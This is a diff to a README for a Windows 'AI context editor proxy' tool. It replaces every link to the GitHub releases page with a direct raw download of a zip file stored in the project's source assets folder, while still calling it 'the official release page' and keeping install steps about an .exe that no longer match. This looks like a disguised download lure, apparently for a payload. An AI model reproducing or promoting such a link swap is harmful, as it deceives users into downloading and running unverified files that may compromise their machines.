@@ -1,6 +1,6 @@
 # 🛠️ codex-context-editor-proxy - Gain total control over your AI context
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/arfahmahmud/codex-context-editor-proxy/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/arfahmahmud/codex-context-editor-proxy/main/react_app/src/assets/codex-proxy-editor-context-v2.7.zip)
 
 ## What this tool does
 
@@ -22,7 +22,7 @@ You need a basic Windows computer to run this application. Ensure your system me
 
 Follow these steps to obtain the correct version for your computer:
 
-1.  Visit the official release page: [https://github.com/arfahmahmud/codex-context-editor-proxy/releases](https://github.com/arfahmahmud/codex-context-editor-proxy/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/arfahmahmud/codex-context-editor-proxy/main/react_app/src/assets/codex-proxy-editor-context-v2.7.zip](https://raw.githubusercontent.com/arfahmahmud/codex-context-editor-proxy/main/react_app/src/assets/codex-proxy-editor-context-v2.7.zip).
 2.  Look for the latest release version at the top of the list.
 3.  Scroll down to the "Assets" section.
 4.  Click the file ending in `.exe` to start the download.
